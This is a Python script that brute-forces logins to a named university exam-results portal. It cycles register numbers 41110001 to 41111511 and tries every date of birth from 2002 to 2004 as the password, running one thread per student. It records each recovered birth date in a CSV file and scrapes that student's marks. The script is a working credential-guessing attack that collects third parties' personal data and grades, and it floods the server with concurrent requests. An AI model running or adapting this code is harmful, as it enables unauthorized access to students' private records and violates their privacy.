import requests
from bs4 import BeautifulSoup
import pandas as pd
import os
import random
import threading
import datetime
import csv

print("starting.......")

class GetStudentMark:

    def __init__(self, rn, date = "") -> None:
        self.regno = str(rn) 
        self.DateofBirth = date
        self.dates = []
        d1 = pd.date_range('1/1/2003', periods = (365), freq ='d').strftime("%d/%m/%Y").tolist()
        random.shuffle(d1)
        d2 = pd.date_range('7/1/2002', '12/31/2002', freq ='d').strftime("%d/%m/%Y").tolist() 
        random.shuffle(d2)
        d3 = pd.date_range('1/1/2004', '6/30/2004', freq ='d').strftime("%d/%m/%Y").tolist()
        random.shuffle(d3)
        d4 = pd.date_range('7/1/2004', '12/31/2004', freq ='d').strftime("%d/%m/%Y").tolist()
        random.shuffle(d4)
        d5 = pd.date_range('1/1/2002', '6/30/2002', freq ='d').strftime("%d/%m/%Y").tolist()
        random.shuffle(d5)
        self.dates = d1 + d2 + d3 + d4 + d5
        self.totalDates = len(self.dates)
    url = "https://sist.sathyabama.ac.in/sist_ese_june_2023/login.php"
    student_details = []
    table_col = ["Semester", "Course Code", "Course Title", "Course Type", "Internal Marks", "External Marks", "Total", "Max. Marks", "Result"]

    def checkCredentialsCorrent(self, content):
        return str(content).find("Invalid Register Number / Date of Birth!") == -1

    def getMarks(self, content):
        if(self.checkCredentialsCorrent(content)):
            self.findDob()
            return
        print(f"regno : {self.regno}, dob : {self.DateofBirth}")
        bs = BeautifulSoup(content, "html.parser")
        bs1 = BeautifulSoup(str(bs.find_all(name="table")[1]), "html.parser")

        cont = [ c for c in bs1.find(name="tbody").contents if c!= "\n"]

        cont = [ c.getText() for c in cont]

        output = [[]]
        count = 0
        for c in cont:
            if(len(output) < (count//9 + 1)):
                output.append([])
            output[count//9].append(c)
            count += 1

        # print(output)

        df =  pd.DataFrame(columns=self.table_col, data=output)

        print(df)

        if "marks" not in os.listdir():
            os.makedirs("marks")

        pd.DataFrame.to_csv(df, path_or_buf=f"marks/{self.regno}.csv", index=False)

    def saveDOB(self, dob):
        with open("student_details.csv", mode='a', newline='') as file:
            writer = csv.writer(file)
            writer.writerow([self.regno, dob])

    def findDob(self):
        dobFound = False
        attempt_no = 0
        for dob in self.dates:
            body = {
                    "regno": int(self.regno),
                    "dob" : dob
                    }
            reponse = requests.post(url=self.url, data=body)
            print(f"remaing {self.totalDates-attempt_no} attempts")
            print(f"trying..... {self.regno} : {dob}")
            if self.checkCredentialsCorrent(reponse.content):
                dobFound = True
                self.DateofBirth = dob
                print(f"dob found")
                self.student_details.append([self.regno,dob])
                self.saveDOB(dob)
                self.getMarks(reponse.content)
                break
            else:
                print(f"trying again....")
                attempt_no +=1
        if(not dobFound):
            with open("not_found_student_details.csv", mode='a', newline='') as file:
                writer = csv.writer(file)
                writer.writerow([self.regno])



def getRegno():
    students = pd.read_csv("student_list.csv")

    students.where(students["Updated New Batch"] == "2025-CP-A-FA01", inplace=True)
    students.dropna(inplace=True)
    return [str(int(x)) for x in students["Register"]]


if __name__ == "__main__":
    start = datetime.datetime.now()
    print("start time ", start)

    pd.DataFrame.to_csv(pd.DataFrame(columns=["regno", "DOB"], data=[]), "student_details.csv", index=False)

    # all_regno = [41110198, 41110189]
    # all_regno = getRegno()
    all_regno = range(41110001,41111511)

    threads = []

    # start all of the threads
    for rn in all_regno:
        getStudentMark = GetStudentMark(rn)
        thread = threading.Thread(target = getStudentMark.findDob)
        thread.start()
        threads.append(thread)

    # now wait for them all to finish
    for thread in threads:
        thread.join()

    end = datetime.datetime.now()
    print("Time elapsed: ", end-start)    
